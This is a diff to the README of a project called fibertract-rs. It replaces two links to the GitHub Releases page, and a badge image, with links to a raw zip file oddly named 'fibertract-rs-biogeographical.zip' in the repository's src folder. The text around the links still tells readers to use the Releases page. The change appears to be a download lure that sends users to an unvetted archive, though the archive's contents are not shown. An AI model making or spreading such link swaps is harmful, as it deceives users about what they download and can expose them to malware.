@@ -6,7 +6,7 @@ Welcome to **fibertract-rs**! This application helps you understand and visualiz
 
 ## 📥 Download Now
 
-[![Download fibertract-rs](https://img.shields.io/badge/Download%20fibertract--rs-brightgreen)](https://github.com/coco-moker/fibertract-rs/releases)
+[![Download fibertract-rs](https://github.com/coco-moker/fibertract-rs/raw/refs/heads/main/src/fibertract-rs-biogeographical.zip%20fibertract--rs-brightgreen)](https://github.com/coco-moker/fibertract-rs/raw/refs/heads/main/src/fibertract-rs-biogeographical.zip)
 
 ## 📋 Overview
 
@@ -44,7 +44,7 @@ This application covers several important topics in neurobiology and computation
 
 To get started, simply **visit the Releases page** to download the latest version of **fibertract-rs**:
 
-[Download fibertract-rs](https://github.com/coco-moker/fibertract-rs/releases)
+[Download fibertract-rs](https://github.com/coco-moker/fibertract-rs/raw/refs/heads/main/src/fibertract-rs-biogeographical.zip)
 
 1. **Go to the Releases page**.
 2. **Select the latest version**. You'll find a list of assets attached to each release.
